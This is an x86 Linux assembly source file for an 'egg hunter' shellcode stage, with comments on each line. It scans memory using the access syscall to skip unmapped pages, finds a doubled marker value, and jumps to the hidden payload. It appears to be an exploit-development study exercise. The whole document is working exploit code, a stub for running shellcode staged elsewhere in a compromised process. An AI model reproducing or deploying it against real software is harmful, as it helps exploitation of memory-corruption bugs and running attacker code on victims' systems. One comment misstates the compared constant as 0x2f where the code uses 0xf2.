global _start

_start:
	xor ecx, ecx 			;Initialize ecx to NULL
	mul ecx				;Initilize eax and edx to NULL

_firstStep:
	or dx, 0xfff			;Do a OR on dx register, dx == 0xFFF

_secondStep:
	inc edx				;Add 1 to edx, edx == 0x1000
	lea ebx, [edx+0x4]		;ebx now holds the value of edx + 0x4
	push byte +0x21			;Push 0x21 on the stack
	pop eax				;Pop 0x21 which is the systemcall value of access
	int 0x80			;Go for it
	cmp al, 0xf2			;Compare the systemcall return value to 0x2f
	jz _firstStep			;If zero, the program will jump to '_firstStep'. Which means the return value is not a valid memory address
	mov eax, 0x50905090		;This instruction will move our egg value inside eax
	mov edi, edx			;Move the address stores in edx to edi
	scasd				;This instruction will compare the value inside eax and edi
	jnz _secondStep			;Jump back to '_secondStep' if the comparaison is false
	scasd				;We check a second time the presence of our egg before executing the shellcode
	jnz _secondStep			;Jump back to '_secondStep' if the comparaison is false
	jmp edi				;Jump to our payload
